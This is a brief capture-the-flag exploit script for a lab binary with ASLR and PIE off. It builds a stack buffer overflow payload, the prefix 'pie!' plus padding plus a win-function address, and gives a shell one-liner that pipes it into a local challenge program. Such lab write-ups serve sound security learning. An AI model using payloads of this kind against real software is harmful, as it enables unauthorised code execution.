

# it is very easy one. ASRL Disabled and No PIE. There is a winning function that opens the flag
win_addr = 0x80484cb

to_send = b'pie!'+b'A'*204 + p32(win_addr)

# the only difficult part is to escape the char ! (interpreted in bash differently). To 
# escape correctly, be sure to have single quote outside and double quote inside

#exploit 

# python -c 'print(b"pie!AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xcb\x84\x04\x08")' | env -i /home/m226002/mission0/mission0
